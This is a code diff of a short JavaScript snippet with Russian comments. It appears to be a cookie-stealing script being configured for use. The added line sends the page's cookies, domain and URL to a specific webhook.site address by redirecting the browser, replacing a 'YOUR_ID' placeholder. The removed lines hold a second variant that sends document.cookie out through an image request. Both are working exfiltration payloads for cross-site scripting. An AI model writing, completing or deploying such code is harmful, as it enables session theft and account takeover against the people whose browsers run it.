@@ -9,13 +9,8 @@ var data = {
 };
 
 // Вариант 1 - в URL (самый надежный)
-window.location = "https://webhook.site/ТВОЙ_ID?" + 
+window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?" + 
     "cookies=" + encodeURIComponent(data.cookies) + 
     "&domain=" + encodeURIComponent(data.domain) +
     "&url=" + encodeURIComponent(data.url);
-
-// Вариант 2 - через изображение
-var img = new Image();
-img.src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?cookies=?cookies=" + 
-    encodeURIComponent(document.cookie || "NO_COOKIES_FOUND");
 </script>
